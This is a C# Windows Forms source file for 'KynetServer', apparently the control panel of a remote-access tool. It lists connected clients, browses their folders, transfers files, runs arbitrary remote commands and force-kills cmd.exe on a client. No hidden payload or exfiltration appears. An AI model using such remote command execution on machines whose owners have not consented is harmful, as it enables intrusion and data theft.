using KynetLib;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Threading;

namespace KynetServer
{
    public partial class Form1 : Form
    {
        public static Form1 form;

        public Form1()
        {
            InitializeComponent();
            form = this;
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            WebAPI.StartWebServer();
            Server server = new Server();
            server.Open();
        }


        private void button1_Click(object sender, EventArgs e)
        {
            Server.ConnectedClients.Where(f => f.Username == Form1.form.listBox1.SelectedItem.ToString()).FirstOrDefault().callback.Message(textBox1.Text);
        }

        private void button2_Click(object sender, EventArgs e)
        {
            Server.ConnectedClients[0].callback.DownloadAsync(textBox2.Text);
        }

        private void button4_Click(object sender, EventArgs e)
        {
            dataGridView1.Rows.Clear();
            foreach (FileTransfer file in Server.FileTransfers)
            {
                string username = Server.ConnectedClients.Where(f => f.Fingerprint == file.Fingerprint).FirstOrDefault().Username;
                dataGridView1.Rows.Add(file.ID, file.FileName, file.FileSize / 1024 / 1024, username, file.transferType.ToString(), file.Progress, file.Completed, file.Failed, file.Failed ? file.Error : "");
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            UserClient client = Server.ConnectedClients.Where(f => f.Username == listBox1.SelectedItem.ToString()).FirstOrDefault();
            ServerToClientFunctions.DownloadToClient(client.Fingerprint, "", textBox3.Text);
        }

        private async void button5_Click(object sender, EventArgs e)
        {
            UserClient client = Server.ConnectedClients.Where(f => f.Username == listBox1.SelectedItem.ToString()).FirstOrDefault();
            DirectoryInformation dir = await Task.Run(() => ServerToClientFunctions.GetDirectoryInfo(client.Fingerprint, textBox4.Text));

            dataGridView2.Rows.Clear();

            //add folders
            if (dir.Folders != null)
            {
                foreach (string folder in dir.Folders)
                {
                    dataGridView2.Rows.Add(new DirectoryInfo(folder).Name, "Folder");
                }
            }
            if (dir.Files != null)
            {
                foreach (FileData file in dir.Files)
                {
                    dataGridView2.Rows.Add(file.Filename, "File", file.Filesize / 1024f, file.FileType);
                }
            }
        }

        private void listBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            UserClient client = Server.ConnectedClients.Where(f => f.Username == listBox1.SelectedItem.ToString()).FirstOrDefault();
            client.Events.RaiseListChangedEvents = true;
        }


        private async void button6_Click(object sender, EventArgs e)
        {
            UserClient client = Server.ConnectedClients.Where(f => f.Username == listBox1.SelectedItem.ToString()).FirstOrDefault();
            List<string> list = await client.callback.ExecuteRemoteCommand(textBox5.Text);

            Console.Clear();
            foreach(string line in list)
            {
                Console.WriteLine(line);
            }
        }

        private async void button7_Click(object sender, EventArgs e)
        {
            UserClient client = Server.ConnectedClients.Where(f => f.Username == listBox1.SelectedItem.ToString()).FirstOrDefault();
            List<string> list = await Task.Factory.StartNew(() => client.callback.ExecuteRemoteCommand("taskkill /im cmd.exe /f")).Result;
        }
    }
}
